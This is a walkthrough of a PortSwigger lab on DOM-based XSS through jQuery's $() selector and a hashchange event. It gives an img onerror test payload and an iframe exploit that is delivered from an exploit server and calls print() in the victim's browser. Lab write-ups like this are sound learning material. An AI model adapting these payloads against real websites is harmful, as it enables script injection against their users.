# Lab-6: [DOM XSS in jQuery selector sink using a hashchange event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)

This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's ``` $() ``` selector function to auto-scroll to a given post, whose title is passed via the ``` location.hash ``` property. 

**Aim :-** To solve the lab, deliver an exploit to the victim that calls the ``` print() ``` function in their browser. 



## Solution 
- Use ``` #<img src=x onerror=alert(123)> ``` in the end of the webpage URL.
    - The web page will popup an alert box with ``` 123 ```.

- This confirms that **XSS** is possible.

- Go to the **exploit server**.

- In the body section add ``` <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe> ```, replace the labs URL in the ``` src ``` and deliver to the victim.
    -  This payload creates a ``` iframe ``` using the webpage link.

    - When the web page loads inside the ``` iframe ``` given ``` <img ``` payload appends to the webpage link.

    - ``` src ``` of the ``` <img ``` is an invalid value so it will trigger the ``` onerror ``` event which will force to perform the ``` print() ``` function.